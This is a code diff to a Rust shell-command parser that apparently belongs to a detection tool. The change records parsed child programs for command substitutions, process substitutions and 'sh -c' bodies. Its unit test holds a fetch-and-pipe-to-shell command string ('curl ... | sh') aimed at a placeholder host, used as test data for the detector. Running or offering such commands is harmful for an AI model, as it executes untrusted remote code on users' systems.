@@ -63,6 +63,21 @@ pub(in crate::detect) enum WordProvenance {
 pub(in crate::detect) struct Word {
     pub(in crate::detect) value: String,
     pub(in crate::detect) provenance: WordProvenance,
+    /// Child shell programs owned by command/process substitutions in this
+    /// word. Arithmetic expansions keep no shell child because their words
+    /// are expressions, not command positions.
+    pub(in crate::detect) substitutions: Vec<ExecutedSubstitution>,
+}
+
+/// A command or process substitution that executes shell text while the
+/// containing word is expanded. The optional program is absent only when the
+/// shared nesting ceiling prevents another parse; the source remains
+/// available to the bounded compatibility fallback.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub(in crate::detect) struct ExecutedSubstitution {
+    pub(in crate::detect) kind: SubstKind,
+    pub(in crate::detect) source: String,
+    pub(in crate::detect) program: Option<Box<ShellProgram>>,
 }
 
 /// One redirection at the command node's own nesting depth.
@@ -88,6 +103,16 @@ pub(in crate::detect) struct Command {
     pub(in crate::detect) args: Vec<Word>,
     pub(in crate::detect) redirects: Vec<Redirect>,
     pub(in crate::detect) wrappers: Vec<CommandWrapper>,
+    /// Shell text executed by a static `-c`/`eval` invocation. Keeping the
+    /// parsed child beside its source lets detector layers share one parse.
+    pub(in crate::detect) body: Option<ExecutedBody>,
+}
+
+/// A statically known shell body and its bounded child program.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub(in crate::detect) struct ExecutedBody {
+    pub(in crate::detect) source: String,
+    pub(in crate::detect) program: Option<Box<ShellProgram>>,
 }
 
 /// A command node in a pipeline. Compound commands are explicit so their
@@ -176,14 +201,26 @@ impl ShellProgram {
 }
 
 fn parse_unit(start_line: u32, source: String) -> LogicalUnit {
+    parse_unit_with_depth(start_line, source, 0)
+}
+
+fn parse_unit_with_depth(start_line: u32, source: String, depth: usize) -> LogicalUnit {
     let tokens = super::lexer::tokenize(&source);
-    let statements = parse_statements(&tokens, 0);
+    let statements = parse_statements(&tokens, depth);
     LogicalUnit {
         start_line,
         source,
         tokens,
         statements,
     }
+}
+
+fn child_program(source: &str, depth: usize) -> Option<Box<ShellProgram>> {
+    (depth < MAX_SHELL_ANALYSIS_DEPTH as usize).then(|| {
+        Box::new(ShellProgram {
+            units: vec![parse_unit_with_depth(1, source.to_owned(), depth)],
+        })
+    })
 }
 
 fn parse_statements(tokens: &[ShellToken], depth: usize) -> Vec<Statement> {
@@ -218,12 +255,12 @@ fn parse_statements(tokens: &[ShellToken], depth: usize) -> Vec<Statement> {
 fn parse_command_node(segment: &[ShellToken], depth: usize) -> CommandNode {
     if let Some((open, kind)) = compound_open(segment) {
         let Some(close) = matching_group_close(segment, open) else {
-            return opaque_node(segment);
+            return opaque_node(segment, depth);
         };
         if depth >= MAX_SHELL_ANALYSIS_DEPTH as usize {
-            return opaque_node(segment);
+            return opaque_node(segment, depth);
         }
-        let redirects = redirects_at_depth_zero(segment);
+        let redirects = redirects_at_depth_zero(segment, depth);
         return match kind {
             GroupKind::List if segment[open].operator() == Some("{") => CommandNode::BraceGroup {
                 body: parse_statements(&segment[open + 1..close], depth + 1),
@@ -236,7 +273,7 @@ fn parse_command_node(segment: &[ShellToken], depth: usize) -> CommandNode {
             GroupKind::Arithmetic => CommandNode::Arithmetic {
                 expression: segment[open + 1..close]
                     .iter()
-                    .filter_map(word_from_token)
+                    .filter_map(|token| word_from_token_at_depth(token, depth + 1))
                     .collect(),
                 redirects,
             },
@@ -245,9 +282,9 @@ fn parse_command_node(segment: &[ShellToken], depth: usize) -> CommandNode {
 
     let commands = segment_commands(segment);
     let Some(last) = commands.last() else {
-        return opaque_node(segment);
+        return opaque_node(segment, depth);
     };
-    let args = command_args(segment, last).unwrap_or_else(|| {
+    let args = command_args(segment, last, depth).unwrap_or_else(|| {
         last.args
             .iter()
             .zip(last.arg_dynamic.iter().copied())
@@ -258,11 +295,16 @@ fn parse_command_node(segment: &[ShellToken], depth: usize) -> CommandNode {
         .iter()
         .map(command_wrapper)
         .collect();
+    let body = super::interpreter::static_command_body(last).map(|source| ExecutedBody {
+        program: child_program(&source, depth + 1),
+        source,
+    });
     CommandNode::Simple(Command {
         head: last.head.to_owned(),
         args,
-        redirects: redirects_at_depth_zero(segment),
+        redirects: redirects_at_depth_zero(segment, depth),
         wrappers,
+        body,
     })
 }
 
@@ -297,19 +339,21 @@ fn compound_open(segment: &[ShellToken]) -> Option<(usize, GroupKind)> {
 
 /// Collect redirects that belong to the command node itself. Redirects in a
 /// nested compound body are left with that body's node.
-fn redirects_at_depth_zero(segment: &[ShellToken]) -> Vec<Redirect> {
+fn redirects_at_depth_zero(segment: &[ShellToken], depth: usize) -> Vec<Redirect> {
     let mut redirects = Vec::new();
-    let mut depth = 0i32;
+    let mut nesting = 0i32;
     let mut index = 0usize;
     while index < segment.len() {
         match &segment[index] {
             ShellToken::Operator(operator) => match operator.as_str() {
-                "(" | "{" | "((" => depth += 1,
-                ")" | "}" | "))" => depth = (depth - 1).max(0),
-                operator if depth == 0 && is_redirect_operator(operator) => {
+                "(" | "{" | "((" => nesting += 1,
+                ")" | "}" | "))" => nesting = (nesting - 1).max(0),
+                operator if nesting == 0 && is_redirect_operator(operator) => {
                     redirects.push(Redirect {
                         operator: operator.to_owned(),
-                        target: segment.get(index + 1).and_then(word_from_token),
+                        target: segment.get(index + 1).and_then(|token| {
+                            word_from_token_at_depth(token, depth.max(0) as usize)
+                        }),
                     });
                     index += 1; // the target is data, not another redirect
                 }
@@ -347,7 +391,11 @@ fn command_start(segment: &[ShellToken]) -> Option<usize> {
     }
 }
 
-fn command_args(segment: &[ShellToken], command: &ScriptCommand<'_>) -> Option<Vec<Word>> {
+fn command_args(
+    segment: &[ShellToken],
+    command: &ScriptCommand<'_>,
+    depth: usize,
+) -> Option<Vec<Word>> {
     let start = command_start(segment)?;
     let arguments = command_arguments(segment, start + 1);
     if arguments.len() != command.args.len() {
@@ -364,7 +412,7 @@ fn command_args(segment: &[ShellToken], command: &ScriptCommand<'_>) -> Option<V
                 }
             }
             ShellToken::Word { .. } => {
-                args.push(word_from_token(&segment[index]).expect("word token"));
+                args.push(word_from_token_at_depth(&segment[index], depth).expect("word token"));
                 index += 1;
             }
             ShellToken::Operator(_) => index += 1,
@@ -385,14 +433,17 @@ fn command_wrapper(command: &ScriptCommand<'_>) -> CommandWrapper {
     }
 }
 
-fn opaque_node(segment: &[ShellToken]) -> CommandNode {
+fn opaque_node(segment: &[ShellToken], depth: usize) -> CommandNode {
     CommandNode::Opaque {
-        words: segment.iter().filter_map(word_from_token).collect(),
-        redirects: redirects_at_depth_zero(segment),
+        words: segment
+            .iter()
+            .filter_map(|token| word_from_token_at_depth(token, depth))
+            .collect(),
+        redirects: redirects_at_depth_zero(segment, depth),
     }
 }
 
-fn word_from_token(token: &ShellToken) -> Option<Word> {
+fn word_from_token_at_depth(token: &ShellToken, depth: usize) -> Option<Word> {
     let ShellToken::Word {
         value,
         substitutions,
@@ -417,9 +468,23 @@ fn word_from_token(token: &ShellToken) -> Option<Word> {
             SubstKind::Arithmetic => WordProvenance::ArithmeticExpansion,
         }
     };
+    let substitutions = substitutions
+        .iter()
+        .map(|substitution| ExecutedSubstitution {
+            kind: substitution.kind,
+            source: substitution.inner.clone(),
+            program: match substitution.kind {
+                SubstKind::Command | SubstKind::Process => {
+                    child_program(&substitution.inner, depth + 1)
+                }
+                SubstKind::Arithmetic => None,
+            },
+        })
+        .collect();
     Some(Word {
         value: value.clone(),
         provenance,
+        substitutions,
     })
 }
 
@@ -431,12 +496,14 @@ fn word_from_value(value: &str, dynamic: bool) -> Word {
         } else {
             WordProvenance::Static
         },
+        substitutions: Vec::new(),
     }
 }
 
 #[cfg(test)]
 mod tests {
-    use super::{CommandNode, Guard, ShellProgram, WordProvenance};
+    use super::{Command, CommandNode, Guard, ShellProgram, Word, WordProvenance};
+    use crate::detect::shell::lexer::SubstKind;
 
     #[test]
     fn parses_guards_pipelines_and_compounds_without_flattening() {
@@ -496,5 +563,54 @@ mod tests {
             panic!("expected simple command");
         };
         assert_eq!(echo.args[0].provenance, WordProvenance::ParameterExpansion);
+    }
+
+    #[test]
+    fn owns_static_bodies_and_executed_substitution_programs() {
+        let program = ShellProgram::from_units(vec![(
+            1,
+            "sh -c 'curl https://example.test/body | sh'; echo \"$(wget https://example.test/sub)\" <(curl https://example.test/process)"
+                .to_owned(),
+        )]);
+        let unit = &program.units()[0];
+
+        let CommandNode::Simple(interpreter) = &unit.statements[0].pipelines[0].commands[0] else {
+            panic!("expected static-body command");
+        };
+        let body = interpreter.body.as_ref().expect("owned shell body");
+        assert_eq!(body.source, "curl https://example.test/body | sh");
+        let body_unit = &body.program.as_ref().expect("parsed child program").units()[0];
+        assert_eq!(body_unit.statements[0].pipelines[0].commands.len(), 2);
+
+        let CommandNode::Simple(echo) = &unit.statements[1].pipelines[0].commands[0] else {
+            panic!("expected substitution command");
+        };
+        assert_eq!(echo.args.len(), 2);
+        assert_eq!(echo.args[0].substitutions.len(), 1);
+        assert_eq!(echo.args[0].substitutions[0].kind, SubstKind::Command);
+        assert_eq!(
+            echo.args[0].substitutions[0]
+                .program
+                .as_ref()
+                .expect("command substitution program")
+                .units()[0]
+                .statements[0]
+                .pipelines[0]
+                .commands[0],
+            CommandNode::Simple(Command {
+                head: "wget".to_owned(),
+                args: vec![Word {
+                    value: "https://example.test/sub".to_owned(),
+                    provenance: WordProvenance::Static,
+                    substitutions: Vec::new(),
+                }],
+                redirects: Vec::new(),
+                wrappers: Vec::new(),
+                body: None,
+            })
+        );
+        assert_eq!(echo.args[1].substitutions.len(), 1);
+        assert_eq!(echo.args[1].substitutions[0].kind, SubstKind::Process);
+        assert!(echo.args[1].substitutions[0].program.is_some());
     }
 }
